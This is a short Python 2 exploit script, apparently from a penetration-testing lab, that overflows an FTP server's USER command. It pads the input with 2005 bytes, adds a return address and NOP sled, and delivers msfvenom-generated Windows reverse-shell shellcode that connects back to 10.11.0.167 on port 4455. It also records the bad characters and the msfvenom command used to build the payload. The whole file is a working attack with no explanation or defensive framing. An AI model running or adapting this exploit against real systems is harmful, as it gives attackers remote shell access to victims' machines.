#!/usr/bin/python
import sys
import socket

# found bad chars- \x00\x0a\x0d\x40
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=4455 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d\x40"
overflow = (
	"\xda\xdf\xba\x09\xe0\x24\x99\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
	"\x52\x31\x55\x17\x83\xc5\x04\x03\x5c\xf3\xc6\x6c\xa2\x1b\x84"
	"\x8f\x5a\xdc\xe9\x06\xbf\xed\x29\x7c\xb4\x5e\x9a\xf6\x98\x52"
	"\x51\x5a\x08\xe0\x17\x73\x3f\x41\x9d\xa5\x0e\x52\x8e\x96\x11"
	"\xd0\xcd\xca\xf1\xe9\x1d\x1f\xf0\x2e\x43\xd2\xa0\xe7\x0f\x41"
	"\x54\x83\x5a\x5a\xdf\xdf\x4b\xda\x3c\x97\x6a\xcb\x93\xa3\x34"
	"\xcb\x12\x67\x4d\x42\x0c\x64\x68\x1c\xa7\x5e\x06\x9f\x61\xaf"
	"\xe7\x0c\x4c\x1f\x1a\x4c\x89\x98\xc5\x3b\xe3\xda\x78\x3c\x30"
	"\xa0\xa6\xc9\xa2\x02\x2c\x69\x0e\xb2\xe1\xec\xc5\xb8\x4e\x7a"
	"\x81\xdc\x51\xaf\xba\xd9\xda\x4e\x6c\x68\x98\x74\xa8\x30\x7a"
	"\x14\xe9\x9c\x2d\x29\xe9\x7e\x91\x8f\x62\x92\xc6\xbd\x29\xfb"
	"\x2b\x8c\xd1\xfb\x23\x87\xa2\xc9\xec\x33\x2c\x62\x64\x9a\xab"
	"\x85\x5f\x5a\x23\x78\x60\x9b\x6a\xbf\x34\xcb\x04\x16\x35\x80"
	"\xd4\x97\xe0\x07\x84\x37\x5b\xe8\x74\xf8\x0b\x80\x9e\xf7\x74"
	"\xb0\xa1\xdd\x1c\x5b\x58\xb6\x28\x97\x62\xe1\x45\xa5\x62\xfc"
	"\xf2\x20\x84\x94\xec\x64\x1f\x01\x94\x2c\xeb\xb0\x59\xfb\x96"
	"\xf3\xd2\x08\x67\xbd\x12\x64\x7b\x2a\xd3\x33\x21\xfd\xec\xe9"
	"\x4d\x61\x7e\x76\x8d\xec\x63\x21\xda\xb9\x52\x38\x8e\x57\xcc"
	"\x92\xac\xa5\x88\xdd\x74\x72\x69\xe3\x75\xf7\xd5\xc7\x65\xc1"
	"\xd6\x43\xd1\x9d\x80\x1d\x8f\x5b\x7b\xec\x79\x32\xd0\xa6\xed"
	"\xc3\x1a\x79\x6b\xcc\x76\x0f\x93\x7d\x2f\x56\xac\xb2\xa7\x5e"
	"\xd5\xae\x57\xa0\x0c\x6b\x77\x43\x84\x86\x10\xda\x4d\x2b\x7d"
	"\xdd\xb8\x68\x78\x5e\x48\x11\x7f\x7e\x39\x14\x3b\x38\xd2\x64"
	"\x54\xad\xd4\xdb\x55\xe4"
	)

crash = "A" * 2005 + "\x33\x5d\xcd\x76" + "\x90" * 15 + overflow

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',21))
	s.recv(1024)
	message='USER ' + crash + '\r\n'
	s.send(message)
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 